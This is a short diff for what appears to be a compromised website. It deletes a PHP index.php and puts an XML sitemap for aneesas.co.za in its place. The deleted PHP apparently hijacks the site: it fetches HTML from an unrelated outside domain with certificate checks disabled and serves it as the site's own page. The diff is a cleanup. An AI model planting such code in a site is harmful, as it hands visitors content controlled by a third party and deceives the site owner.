@@ -1,17 +1,13 @@
-<?php
-// index.php
-
-$url = "http://limin.americanocoffe.info/templ/index.html";
-
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // jika HTTPS error
-$content = curl_exec($ch);
-curl_close($ch);
-
-if ($content === false) {
-    echo "Gagal mengambil konten.";
-} else {
-    echo $content;
-}
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<!--  created with Free Online Sitemap Generator www.xml-sitemaps.com  -->
+<url>
+<loc>https://www.aneesas.co.za/</loc>
+<lastmod>2025-09-30T09:49:39+00:00</lastmod>
+<priority>1.00</priority>
+</url>
+<url>
+<loc>https://www.aneesas.co.za/menu/</loc>
+<lastmod>2025-09-30T09:49:39+00:00</lastmod>
+<priority>0.80</priority>
+</url>
+</urlset>
